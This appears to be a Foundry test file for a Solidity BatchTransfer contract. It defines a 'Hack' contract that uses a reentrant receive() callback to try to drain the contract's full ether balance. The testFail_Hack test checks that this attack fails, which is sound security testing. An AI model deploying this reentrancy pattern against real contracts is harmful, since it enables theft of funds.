pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {BatchTransfer} from "../src/BatchTransfer.sol";

contract Hack {
    receive() external payable {
        if (msg.sender.balance == 0) {
            return;
        }
        address payable[] memory recipients = new address payable[](1);
        recipients[0] = payable(address(this));
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = msg.sender.balance;

        console.log("balance before hack", address(this).balance);
        BatchTransfer(msg.sender).batchTransferEther(recipients, amounts);
        console.log("balance after hack", address(this).balance);
    }
}

contract BatchTransferTest is Test {
    BatchTransfer public batchTransfer;
    address hacker;

    function setUp() public {
        batchTransfer = new BatchTransfer();
        hacker = address(new Hack());
    }

    function testFail_Hack() public {
        address payable[] memory recipients = new address payable[](3);
        recipients[0] = payable(address(111));
        recipients[1] = payable(address(222));
        recipients[2] = payable(hacker);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;
        amounts[2] = 1 ether;

        batchTransfer.batchTransferEther{value: 4 ether}(recipients, amounts);
    }
}
